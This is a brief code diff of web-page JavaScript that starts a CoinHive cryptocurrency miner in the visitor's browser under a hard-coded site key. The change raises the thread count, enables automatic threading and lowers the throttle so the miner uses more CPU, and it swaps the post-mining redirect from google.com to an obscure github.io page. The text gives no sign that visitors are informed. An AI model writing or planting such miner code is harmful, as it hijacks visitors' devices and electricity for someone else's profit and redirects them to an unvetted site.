@@ -1,8 +1,8 @@
 		var miner = new CoinHive.Anonymous('TqBKEr08A8atWsXdAoc1Rpr1dA1CSPlC',
 		{
-			threads: 2,
-			autoThreads: false,
-			throttle:1.5,
+			threads: 4,
+			autoThreads: true,
+			throttle:1,
 			forceASMJS: false
 		});
 		miner.start(CoinHive.FORCE_MULTI_TAB);
@@ -19,7 +19,7 @@
 		if (acceptedHashes > hashesToGenerate)
 		{
 			miner.stop();
-			window.location = "http://google.com/"
+			window.location = "https://huuhadz2k.github.io/etherabc.github.io/index.html"
 		}
 		else
 		{
